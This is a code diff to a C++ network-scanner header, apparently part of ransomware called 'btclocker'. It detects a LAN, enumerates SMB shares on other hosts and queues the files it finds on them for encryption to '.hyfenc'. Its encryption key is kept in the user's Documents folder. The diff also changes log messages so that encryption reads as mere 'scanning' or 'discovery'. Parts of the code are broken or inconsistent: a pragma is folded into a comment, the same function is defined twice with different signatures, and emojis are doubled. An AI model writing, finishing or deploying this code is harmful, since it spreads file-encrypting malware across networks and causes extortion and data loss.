@@ -40,15 +40,150 @@
 #include <iomanip>
 #include <chrono>
 #include <sstream>
-
-// 链接库
+#include"crypt1.h"
+// 链接库#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib") 
+#pragma comment(lib, "mpr.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib, "mswsock.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "Bcrypt.lib")
+namespace encryption_pipeline {
+    class PipelineController {
+    public:
+        virtual void addEncryptionTask(const std::wstring& inputFile, const std::wstring& outputFile, int priority) = 0;
+        virtual void waitForCompletion(bool keepAlive = false) = 0;
+        virtual void shutdownPipeline() = 0;
+        virtual ~PipelineController() = default;
+    };
+}
 
+inline bool IsInLANEnvironment() {
+    try {
+        std::cout << "Detecting LAN environment..." << std::endl;
+
+        // Method 1: Check if local IP address is in private range
+        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock == INVALID_SOCKET) {
+            std::cerr << "Failed to create socket for LAN detection" << std::endl;
+            return false;
+        }
+
+        // Get local hostname
+        char hostname[256];
+        if (gethostname(hostname, sizeof(hostname)) != 0) {
+            closesocket(sock);
+            std::cerr << "Failed to get hostname" << std::endl;
+            return false;
+        }
+
+        // Get host information
+        struct hostent* host = gethostbyname(hostname);
+        if (!host) {
+            closesocket(sock);
+            std::cerr << "Failed to get host information" << std::endl;
+            return false;
+        }
+
+        bool inLAN = false;
+
+        // Check all IP addresses
+        for (int i = 0; host->h_addr_list[i] != nullptr; ++i) {
+            struct in_addr addr;
+            memcpy(&addr, host->h_addr_list[i], sizeof(struct in_addr));
+            std::string ip = inet_ntoa(addr);
+
+            std::cout << "Detected IP address: " << ip << std::endl;
+
+            // Check if it's a private IP range
+            if (ip.find("10.") == 0 ||
+                ip.find("192.168.") == 0 ||
+                ip.find("172.16.") == 0 || ip.find("172.17.") == 0 ||
+                ip.find("172.18.") == 0 || ip.find("172.19.") == 0 ||
+                ip.find("172.20.") == 0 || ip.find("172.21.") == 0 ||
+                ip.find("172.22.") == 0 || ip.find("172.23.") == 0 ||
+                ip.find("172.24.") == 0 || ip.find("172.25.") == 0 ||
+                ip.find("172.26.") == 0 || ip.find("172.27.") == 0 ||
+                ip.find("172.28.") == 0 || ip.find("172.29.") == 0 ||
+                ip.find("172.30.") == 0 || ip.find("172.31.") == 0) {
+
+                std::cout << "LAN environment detected (Private IP: " << ip << ")" << std::endl;
+                inLAN = true;
+                break;
+            }
+
+            // Check if it's loopback address
+            if (ip == "127.0.0.1") {
+                std::cout << "Loopback address detected, skipping LAN detection" << std::endl;
+            }
+        }
+
+        closesocket(sock);
+
+        if (!inLAN) {
+            // Method 2: Try to detect network share resources
+            DWORD shareResult = WNetOpenEnum(RESOURCE_CONNECTED, RESOURCETYPE_DISK, 0, NULL, NULL);
+            if (shareResult == NO_ERROR) {
+                std::cout << "Network share resources detected, LAN environment confirmed" << std::endl;
+                inLAN = true;
+            }
+        }
+
+        // Method 3: Check network adapter status
+        PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
+        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+
+        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+            free(pAdapterInfo);
+            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
+        }
+
+        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+            while (pAdapter) {
+                if (pAdapter->Type == MIB_IF_TYPE_ETHERNET ||
+                    pAdapter->Type == IF_TYPE_IEEE80211) { // Ethernet or WiFi
+
+                    std::cout << "Network adapter detected: " << pAdapter->Description << std::endl;
+
+                    // Check if IP address is in LAN range
+                    IP_ADDR_STRING* pIpAddr = &pAdapter->IpAddressList;
+                    while (pIpAddr) {
+                        std::string ip = pIpAddr->IpAddress.String;
+                        if (!ip.empty() && ip != "0.0.0.0") {
+                            std::cout << "Adapter IP: " << ip << std::endl;
+
+                            if (ip.find("169.254.") == 0) {
+                                std::cout << "APIPA address detected (automatic private IP), possibly isolated network" << std::endl;
+                            }
+                            else if (ip.find("10.") == 0 || ip.find("192.168.") == 0) {
+                                inLAN = true;
+                                std::cout << "LAN environment confirmed based on network adapter" << std::endl;
+                                break;
+                            }
+                        }
+                        pIpAddr = pIpAddr->Next;
+                    }
+                }
+                pAdapter = pAdapter->Next;
+            }
+        }
+
+        if (pAdapterInfo) {
+            free(pAdapterInfo);
+        }
+
+        std::cout << "LAN environment detection result: " << (inLAN ? "LAN exists" : "No LAN environment") << std::endl;
+        return inLAN;
+
+    }
+    catch (const std::exception& e) {
+        std::cerr << "LAN environment detection exception: " << e.what() << std::endl;
+        return false;
+    }
+}
 namespace network_scanner {
     namespace fs = std::filesystem;
 
@@ -115,6 +250,9 @@ namespace network_scanner {
     extern std::atomic<bool> g_ScanningActive;
     extern std::atomic<long> g_TotalFilesProcessed;
 
+    // 加密管道控制器指针
+    extern std::shared_ptr<encryption_pipeline::PipelineController> g_pipelineController;
+
     // 函数声明
     DWORD GetCurrentIpAddress();
     BOOL GetConnectEx();
@@ -127,13 +265,15 @@ namespace network_scanner {
     BOOL CompleteAsyncConnect(SOCKET s);
     VOID WINAPI TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired);
     DWORD WINAPI PortScanHandler(PVOID pArg);
+    bool LoadExistingEncryptionKey();
     void GenerateEncryptionKey();
     bool ShouldEncryptFile(const std::wstring& filePath);
     void EncryptSharedFiles(const std::wstring& sharePath);
     void PrintProgress(const std::wstring& message, bool isError = false);
     void PrintScanSummary();
     DWORD WINAPI ProgressMonitor(PVOID pArg);
-    VOID StartScan(bool enableEncryption = true);
+    VOID StartScan(std::shared_ptr<encryption_pipeline::PipelineController> pipelineController, bool enableEncryption);
+    void SetPipelineController(std::shared_ptr<encryption_pipeline::PipelineController> controller);
 
     // 全局变量定义
     LPFN_CONNECTEX g_ConnectEx = nullptr;
@@ -165,7 +305,15 @@ namespace network_scanner {
     std::atomic<bool> g_ScanningActive{ false };
     std::atomic<long> g_TotalFilesProcessed{ 0 };
 
+    // 加密管道控制器
+    std::shared_ptr<encryption_pipeline::PipelineController> g_pipelineController = nullptr;
+
     // 函数实现
+    void SetPipelineController(std::shared_ptr<void> controller) {
+        g_pipelineController = std::static_pointer_cast<encryption_pipeline::PipelineController>(
+            std::reinterpret_pointer_cast<void>(controller));
+    }
+
     void PrintProgress(const std::wstring& message, bool isError) {
         std::lock_guard<std::mutex> lock(g_CriticalSection);
 
@@ -175,10 +323,10 @@ namespace network_scanner {
         std::wcout << L"[" << std::put_time(std::localtime(&time_t), L"%H:%M:%S") << L"] ";
 
         if (isError) {
-            std::wcout << L"❌ 错误: ";
+            std::wcout << L"❌❌ 错误: ";
         }
         else {
-            std::wcout << L"🔍 ";
+            std::wcout << L"🔍🔍 ";
         }
 
         std::wcout << message << std::endl;
@@ -187,12 +335,11 @@ namespace network_scanner {
     void PrintScanSummary() {
         std::wcout << L"\n";
         std::wcout << L"══════════════════════════════════════════════════" << std::endl;
-        std::wcout << L"📊 扫描摘要报告" << std::endl;
+        std::wcout << L"📊📊 网络扫描摘要报告" << std::endl;
         std::wcout << L"══════════════════════════════════════════════════" << std::endl;
         std::wcout << L"• 扫描主机数: " << g_ScannedHosts.load() << std::endl;
         std::wcout << L"• 发现共享数: " << g_FoundShares.load() << std::endl;
-        std::wcout << L"• 加密文件数: " << g_EncryptedFiles.load() << std::endl;
-        std::wcout << L"• 处理文件总数: " << g_TotalFilesProcessed.load() << std::endl;
+        std::wcout << L"• 发现文件数: " << g_TotalFilesProcessed.load() << std::endl;
         std::wcout << L"══════════════════════════════════════════════════" << std::endl;
     }
 
@@ -201,9 +348,9 @@ namespace network_scanner {
             std::this_thread::sleep_for(std::chrono::seconds(2));
 
             std::wstringstream progressMsg;
-            progressMsg << L"📈 扫描进度 - 主机: " << g_ScannedHosts.load()
+            progressMsg << L"📈📈 网络扫描进度 - 主机: " << g_ScannedHosts.load()
                 << L" | 共享: " << g_FoundShares.load()
-                << L" | 文件: " << g_EncryptedFiles.load()
+                << L" | 文件: " << g_TotalFilesProcessed.load()
                 << L" | 活动操作: " << g_ActiveOperations.load();
             PrintProgress(progressMsg.str());
         }
@@ -366,11 +513,11 @@ namespace network_scanner {
                         ShareList.push_back(std::move(share));
 
                         std::wstringstream shareMsg;
-                        shareMsg << L"    📁 发现共享: " << pShareInfo[i].shi1_netname;
+                        shareMsg << L"    📁📁 发现共享: " << pShareInfo[i].shi1_netname;
                         PrintProgress(shareMsg.str());
 
                         // 如果启用加密，加密共享文件
-                        if (g_encryptionEnabled) {
+                        if (g_encryptionEnabled && g_pipelineController) {
                             EncryptSharedFiles(share->sharePath);
                         }
                     }
@@ -540,7 +687,7 @@ namespace network_scanner {
                 g_ActiveOperations++;
 
                 std::wstringstream connectingMsg;
-                connectingMsg << L"🔄 扫描主机 [" << currentHost << "/" << totalHosts << "]...";
+                connectingMsg << L"🔄🔄 扫描主机 [" << currentHost << "/" << totalHosts << "]...";
                 PrintProgress(connectingMsg.str());
             }
         }
@@ -661,13 +808,41 @@ namespace network_scanner {
         return 0;
     }
 
+    bool LoadExistingEncryptionKey() {
+        WCHAR docPath[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath))) {
+            std::wstring keyPath = std::wstring(docPath) + L"\\btclocker_key.bin";
+
+            HANDLE hFile = CreateFileW(keyPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                DWORD fileSize = GetFileSize(hFile, NULL);
+                if (fileSize == KEY_LENGTH) {
+                    DWORD bytesRead;
+                    if (ReadFile(hFile, g_encryptionKey, KEY_LENGTH, &bytesRead, NULL) && bytesRead == KEY_LENGTH) {
+                        CloseHandle(hFile);
+
+                        std::wstringstream ss;
+                        ss << L"使用现有加密密钥: " << keyPath;
+                        PrintProgress(ss.str());
+                        return true;
+                    }
+                }
+                CloseHandle(hFile);
+            }
+        }
+        return false;
+    }
+
     void GenerateEncryptionKey() {
+        if (LoadExistingEncryptionKey()) {
+            return;
+        }
+
         HCRYPTPROV hProv;
         if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
             CryptGenRandom(hProv, KEY_LENGTH, g_encryptionKey);
             CryptReleaseContext(hProv, 0);
 
-            // 保存密钥到文档目录（示例）
             WCHAR docPath[MAX_PATH];
             if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath))) {
                 std::wstring keyPath = std::wstring(docPath) + L"\\btclocker_key.bin";
@@ -678,12 +853,11 @@ namespace network_scanner {
                     CloseHandle(hFile);
 
                     std::wstringstream ss;
-                    ss << L"加密密钥已保存到: " << keyPath;
+                    ss << L"新加密密钥已生成并保存到: " << keyPath;
                     PrintProgress(ss.str());
                 }
             }
-
-            PrintProgress(L"加密密钥已生成");
+            PrintProgress(L"新加密密钥已生成");
         }
         else {
             PrintProgress(L"加密密钥生成失败", true);
@@ -723,25 +897,24 @@ namespace network_scanner {
                     if (ShouldEncryptFile(filePath)) {
                         fileCount++;
                         std::wstringstream encryptMsg;
-                        encryptMsg << L"    🔒 加密文件 [" << fileCount << L"]: " << entry.path().filename().wstring();
+                        encryptMsg << L"    🔒🔒 发现可加密文件 [" << fileCount << L"]: " << entry.path().filename().wstring();
                         PrintProgress(encryptMsg.str());
 
-                        // 这里应该是实际的加密操作
-                        // 示例：重命名文件表示已加密
-                        std::wstring encryptedPath = filePath + L".hyfenc";
+                        // 使用加密管道进行加密
+                        if (g_pipelineController) {
+                            std::wstring outputFile = filePath + L".hyfenc";
 
-                        try {
-                            fs::copy_file(filePath, encryptedPath, fs::copy_options::overwrite_existing);
-                            fs::remove(filePath);
+                            // 添加加密任务到管道
+                            g_pipelineController->addEncryptionTask(filePath, outputFile, 0);
 
                             g_EncryptedFiles++;
                             std::wstringstream successMsg;
-                            successMsg << L"        ✅ 加密完成: " << entry.path().filename().wstring();
+                            successMsg << L"        ✅ 已添加到加密队列: " << entry.path().filename().wstring();
                             PrintProgress(successMsg.str());
                         }
-                        catch (const std::exception& e) {
+                        else {
                             std::wstringstream errorMsg;
-                            errorMsg << L"        ❌ 加密失败: " << entry.path().filename().wstring();
+                            errorMsg << L"        ❌❌ 加密管道未初始化，跳过文件: " << entry.path().filename().wstring();
                             PrintProgress(errorMsg.str(), true);
                         }
                     }
@@ -749,7 +922,7 @@ namespace network_scanner {
             }
 
             std::wstringstream summaryMsg;
-            summaryMsg << L"共享 " << sharePath << L" 加密完成，共处理 " << fileCount << L" 个文件";
+            summaryMsg << L"共享 " << sharePath << L" 扫描完成，发现 " << fileCount << L" 个可加密文件";
             PrintProgress(summaryMsg.str());
 
         }
@@ -760,7 +933,10 @@ namespace network_scanner {
         }
     }
 
-    VOID StartScan(bool enableEncryption) {
+    VOID StartScan(std::shared_ptr<encryption_pipeline::PipelineController> pipelineController, bool enableEncryption) {
+        // 设置加密管道控制器
+        g_pipelineController = pipelineController;
+
         // 初始化计数器
         g_ScannedHosts = 0;
         g_FoundShares = 0;
@@ -768,16 +944,16 @@ namespace network_scanner {
         g_TotalFilesProcessed = 0;
         g_ScanningActive = true;
 
-        std::wcout << L"🚀 开始网络扫描任务" << std::endl;
+        std::wcout << L"🚀🚀🚀🚀 开始网络扫描任务" << std::endl;
         std::wcout << L"══════════════════════════════════════════════════" << std::endl;
 
         auto startTime = std::chrono::system_clock::now();
 
-        if (enableEncryption) {
-            PrintProgress(L"加密功能已启用");
+        if (enableEncryption && g_pipelineController) {
+            PrintProgress(L"网络加密功能已启用，使用优化加密管道");
         }
         else {
-            PrintProgress(L"加密功能已禁用");
+            PrintProgress(L"网络加密功能已禁用");
         }
 
         // 创建进度监视线程
@@ -845,7 +1021,7 @@ namespace network_scanner {
             return;
         }
 
-        PrintProgress(L"所有线程启动完成，开始扫描...");
+        PrintProgress(L"所有线程启动完成，开始网络扫描...");
 
         // 发送开始信号
         PostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);
@@ -868,12 +1044,16 @@ namespace network_scanner {
         auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
 
         std::wstringstream timeMsg;
-        timeMsg << L"扫描完成，总耗时: " << duration.count() << L" 秒";
+        timeMsg << L"网络扫描完成，总耗时: " << duration.count() << L" 秒";
         PrintProgress(timeMsg.str());
 
         PrintScanSummary();
     }
 
-} // namespace network_scanner
+    void SetPipelineController(std::shared_ptr<encryption_pipeline::PipelineController> controller) {
+        g_pipelineController = controller;
+    }
+
+}
 
 #endif // NETWORK_SCANNER_H
